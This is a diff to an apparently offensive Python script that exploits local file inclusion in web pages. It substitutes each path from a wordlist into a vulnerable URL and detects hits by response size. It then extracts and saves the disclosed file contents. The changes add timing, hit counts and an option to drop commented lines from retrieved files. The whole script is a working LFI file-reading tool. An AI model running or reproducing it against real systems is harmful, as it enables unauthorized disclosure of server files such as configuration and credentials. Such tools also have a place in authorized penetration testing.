@@ -1,10 +1,15 @@
 import sys
 from argparse import ArgumentParser
 from urllib.request import urlopen
+import time
+
+class bcolors:
+    OKCYAN = '\033[96m'
+    ENDC = '\033[0m'
 
 def vrfy_args():
     try:
-        open(args.list)
+         open(args.list)
     except Exception as e:
         print("Unable to open the file " + args.list)
         sys.exit()
@@ -14,6 +19,10 @@ def vrfy_args():
         sys.exit()
 
 def exploit_LFI():
+
+    start = time.time()
+    total_length = 0
+    total_true = 0
 
     ## Check the default page size when nothing came out of the LFI
     random = "VQ328FEBWUBFI32BUI3BBF"
@@ -25,11 +34,12 @@ def exploit_LFI():
     url = args.url
     f = open(args.list)
     for line in f.readlines():
+        total_length += 1
         url_var = url.replace('LFI', line)
         page = urlopen(url_var)
         content = page.read()
         if len(content) != default_size:
-
+            total_true +=1
             if default_size is not 0:
                 final_content = clean_output(content.decode("utf-8"),default_page.decode("utf-8"))
             else:
@@ -41,6 +51,10 @@ def exploit_LFI():
                     f.write("#########################\nResult for => " + line + "#########################\n\n" + final_content)
                     f.close()
 
+    end = time.time()
+    duration = round(end - start,2)
+
+    final_info_print(total_length,total_true,duration)
 
 def clean_output(content,default_page):
     ## function to only keep the LFI result and remove the value that are part of the website
@@ -50,10 +64,19 @@ def clean_output(content,default_page):
     new_content = ""
     for line in content.splitlines():
         if not line == "":
-            new_content += line + "\n"
+            if args.f:
+                if not (line.startswith("#") or line.startswith(" #")):
+                    new_content += line + "\n"
+            else:
+                new_content += line + "\n"
 
     new_content += "\n"
     return new_content
+
+
+
+def final_info_print(total,true_value,duration):
+    print("The script took " + bcolors.OKCYAN + str(duration) + bcolors.ENDC + " Secondes\nWordlist lenght is " +bcolors.OKCYAN + str(total) + bcolors.ENDC + "\nNumber of file(s) found is " + bcolors.OKCYAN +  str(true_value) + bcolors.ENDC)
 
 
 if __name__ == '__main__':
@@ -62,8 +85,11 @@ if __name__ == '__main__':
                    help='Path to the wordlist file', required=True)
     p.add_argument('-u', '--url', dest='url', help='Url of the LFI vulnerable web page http://localhost?file=LFI',
                    required=True)
+    p.add_argument('-f', help='Used to filter out all commented line find in a file', required=False,action='store_true')
     p.add_argument('-o', '--outfile', dest='dest', help='Path to the output file, if none the output will be display on the screen', required=False)
     args = p.parse_args()
 
+
     vrfy_args()
     exploit_LFI()
+
